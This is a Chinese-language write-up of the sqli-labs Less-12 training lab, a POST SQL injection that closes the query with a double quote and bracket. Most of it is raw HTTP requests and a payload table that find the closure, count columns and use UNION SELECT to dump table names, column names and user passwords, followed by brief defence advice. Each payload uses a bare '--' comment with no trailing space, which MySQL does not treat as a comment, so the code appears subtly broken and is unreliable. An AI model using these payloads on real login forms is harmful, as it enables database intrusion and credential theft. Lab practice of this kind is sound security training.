# sqli-labs Less-12 漏洞复现（POST型双引号括号闭合注入）

#### 1. 漏洞分析

Less-12 是 **POST 型注入**，通过 `uname` 和 `passwd` 两个参数提交数据。从报错信息 `near '123456")'` 可以判断，SQL 语句的闭合方式为：

```SQL

... WHERE username=("uname") AND password=("passwd")
```

因此，注入点需要用 `")` 来闭合双引号和括号，再用 `--` 或 `#` 注释掉后续语句。

---

#### 2. 复现步骤（使用 HackBar 或 Burp Suite）

##### 步骤1：判断闭合方式

构造 payload 测试闭合：

```HTTP

POST /sqli-labs/Less-12/ HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

uname=admin")--&passwd=123456&submit=Submit
```

如果页面正常显示（无报错），说明闭合方式 `")` 正确。

##### 步骤2：判断列数

使用 `ORDER BY` 语句判断查询列数：

```HTTP

uname=admin") order by 3--&passwd=123456&submit=Submit
```

- 若报错，说明列数小于3；

- 再试 `order by 2--`，若页面正常，说明查询结果有 **2列**。

##### 步骤3：爆表名（获取当前数据库的表）

```HTTP

uname=admin") union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database())--&passwd=123456&submit=Submit
```

返回结果示例：`users,emails,referers,uagents`

##### 步骤4：爆列名（获取 users 表的列）

```HTTP

uname=admin") union select 1, (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')--&passwd=123456&submit=Submit
```

返回结果示例：`id,username,password`

##### 步骤5：爆数据（获取用户名和密码）

```HTTP

uname=admin") union select 1, (select group_concat(concat(username,0x3a,password)) from users)--&passwd=123456&submit=Submit
```

返回结果示例：`Dumb:Dumb,Angelina:I-kill-you,admin:admin`

---

#### 3. 关键 payload 汇总

|目标|Payload|
|---|---|
|闭合测试|`uname=admin")--&passwd=123456&submit=Submit`|
|判断列数|`uname=admin") order by 2--&passwd=123456&submit=Submit`|
|爆表名|`uname=admin") union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database())--&passwd=123456&submit=Submit`|
|爆列名|`uname=admin") union select 1, (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')--&passwd=123456&submit=Submit`|
|爆数据|`uname=admin") union select 1, (select group_concat(concat(username,0x3a,password)) from users)--&passwd=123456&submit=Submit`|
---

#### 4. 防御建议

- 使用 **预处理语句（Prepared Statements）** 避免 SQL 拼接；

- 对用户输入进行严格的白名单校验和转义；

- 限制数据库账号权限，避免使用高权限账号连接应用。
> （注：文档部分内容可能由 AI 生成）